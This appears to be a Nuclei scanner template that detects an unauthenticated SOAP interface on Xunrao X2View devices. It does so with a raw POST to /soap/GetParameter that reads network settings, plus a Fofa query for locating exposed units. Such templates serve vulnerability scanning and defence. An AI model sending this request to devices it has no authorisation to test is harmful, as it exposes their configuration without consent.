id: Xunrao_X2View_soap_Unauthorized

info:
  name: Xunrao_X2View_soap_Unauthorized
  author: HK
  severity: high
  description: Xunrao Technology X2View All interfaces are unauthorized
  metadata:
    max-request: 1
    Fofa-query: icon_hash="-1384370370"
    verified: true

http:
- raw:
  - |-
    @timeout: 30s
    POST /soap/GetParameter HTTP/1.1
    Host: {{Hostname}}
    Accept-Language: zh-CN,zh;q=0.9
    Accept: application/json, text/plain, */*
    Content-Type: application/x-www-form-urlencoded
    Accept-Encoding: gzip, deflate
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
    Cookie: language=en; language=en
    Content-Length: 74

    <Parameter>
              <NetWork>
              </NetWork>
          </Parameter>

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - Gateway